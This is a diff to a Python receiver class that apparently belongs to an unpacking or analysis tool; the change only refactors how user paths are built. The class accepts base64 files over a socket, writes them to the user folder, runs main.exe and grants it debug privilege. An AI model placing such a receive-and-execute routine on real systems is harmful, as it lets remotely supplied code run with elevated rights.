@@ -6,6 +6,7 @@ import socket
 import time
 
 from receiver.WindowsManipulator import WindowsManipulator
+from utility.win_env import get_user_path
 
 LOG = logging.getLogger(__name__)
 logging.basicConfig(level=logging.DEBUG, format="%(asctime)-15s %(message)s")
@@ -14,7 +15,7 @@ logging.basicConfig(level=logging.DEBUG, format="%(asctime)-15s %(message)s")
 class Receiver:
 
     def __init__(self):
-        self.user_path = "C:\\Users\\%s\\" % os.getenv("username")
+        self.user_path = get_user_path()
         self.sock = self._init_socket()
         self.win_manipulator = WindowsManipulator()
 
@@ -58,7 +59,8 @@ class Receiver:
             self._write_b64_encoded_file(filename, received_files["unpacker"][filename])
 
     def _write_b64_encoded_file(self, filename, data):
-        with open(self.user_path + filename, "wb") as f_out:
+        fp = os.path.join(self.user_path, filename)
+        with open(fp, "wb") as f_out:
             f_out.write(base64.b64decode(data))
 
     def run(self):
@@ -68,7 +70,7 @@ class Receiver:
         LOG.debug("writing files...")
         self._write_files(receivedData)
         time.sleep(1)
-        process_id = self.win_manipulator.create_process(self.user_path + "main.exe")
+        process_id = self.win_manipulator.create_process(os.path.join(self.user_path, "main.exe"))
         time.sleep(1)
         self.win_manipulator.grant_debug_privilege(process_id)
 
